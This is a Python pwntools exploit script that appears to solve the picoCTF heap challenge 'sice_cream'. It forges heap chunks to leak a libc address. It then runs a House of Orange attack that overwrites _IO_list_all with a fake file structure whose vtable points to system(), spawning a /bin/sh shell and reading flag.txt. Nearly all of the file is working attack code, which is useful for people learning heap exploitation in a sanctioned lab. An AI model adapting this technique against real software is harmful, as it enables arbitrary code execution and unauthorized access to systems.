import struct
from pwn import *

#####################################################change directory######################################################
level = "sice_cream"
ip = "jupiter.challenges.picoctf.org:9521"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

####################################################operation mode#######################################################
args.DEBUG = False
args.REMOTE = True
args.gdbscript = "break *0x00400c19\ndefine hook-stop\nx/100wx 0x602040\nend\n"
#####################################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/sice_cream")
libc = ELF(dir + "/libc.so.6")
#######################################################start process##############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG: 
        return gdb.debug(binary.path, gdbscript=args.gdbscript)
    else:
        return process([binary.path])
r = conn()
################################################Useful functions#########################################################
def buy_chunk(size, flavor):
    r.sendlineafter(">", b"1")
    r.sendlineafter(">", size)
    r.sendlineafter(">", flavor)
def eat_chunk(index):
    r.sendlineafter(">", b"2")
    r.sendlineafter(">", index)
def re_intro(name):
    r.sendlineafter(">", b"3")
    r.sendlineafter(">", name)
#################################################Leak libc address###################################################
setup_name_with_small_bin_chunk_struct = struct.pack("l", 0) + struct.pack("l", 0xc1) 
setup_name_with_small_bin_chunk_struct += struct.pack("l", 0)*22
setup_name_with_small_bin_chunk_struct += struct.pack("l", 0xc1) + struct.pack("l", 0x31) 
setup_name_with_small_bin_chunk_struct += struct.pack("l", 0)*5 + struct.pack("l", 0x41)
r.sendafter(">", setup_name_with_small_bin_chunk_struct)
buy_chunk(b"56", b"a"*8)                                    #we are using 56 to store a chunk of 0x41 size because the last char will be \n making total of 64(0x41) size
buy_chunk(b"56", b"b"*8)
eat_chunk(b"0")
eat_chunk(b"1")
eat_chunk(b"0")
buy_chunk(b"56", struct.pack("l", 0x602130))                 #we are storing the header of the fake chunk header as fd and bk pointers in unsorted bin use header address of the free chunks
buy_chunk(b"56", b"b"*8)
buy_chunk(b"56", b"a"*8)
buy_chunk(b"56", struct.pack("l", 0x602050))                   #we are using 0x602050 instead to chunk header address 0x602040 because the cream array stores the data address of the chunk
eat_chunk(b"0")
re_intro(b"AAAABBBBCCCCDDD")                                    #15 bytes because the 16th byte will be \n
r.recvuntil("AAAABBBBCCCCDDD")
r.recvline()
address = int.from_bytes(r.recvline()[:-2], 'little')
libc_base = address - 0x3C4B78 #how to get this????????
IO_LIST_ALL = libc_base + libc.symbols['_IO_list_all'] #0x3c4520
system = libc_base + libc.symbols['system'] #0x45390
argument = b"/bin/sh\x00"
log.info("Leaked libc: {0}".format(hex(libc_base)))
log.info("_IO_list_all: {0}".format(hex(IO_LIST_ALL)))
log.info("system: {0}".format(hex(system)))
############################################House of Orange##############################################################
# argument = b"flag.txt"
# system = 0x400cc4
setup_fake_IO_struct = argument + struct.pack("l", 0x61)                              # make size appropriate to store the chunk in the small bin[4]
setup_fake_IO_struct += struct.pack("l", 0xdeadbeef) + struct.pack("l", IO_LIST_ALL - 0x10)                #target is the IO_LIST_ALL
setup_fake_IO_struct += struct.pack("l", 2) + struct.pack("l", 3)               #bypassing checks
setup_fake_IO_struct += struct.pack("l", system)*18                         # making a vtable
setup_fake_IO_struct += struct.pack("l", 0)*2                               #bypassing checks
setup_fake_IO_struct += struct.pack("l", 0) + struct.pack("l", 0x6020a0)                     #pointing to vtable
re_intro(setup_fake_IO_struct)
r.sendlineafter(">", b"1")
r.sendlineafter(">", b"40")
time.sleep(0.05)
r.sendline(b"cat flag.txt")
r.interactive()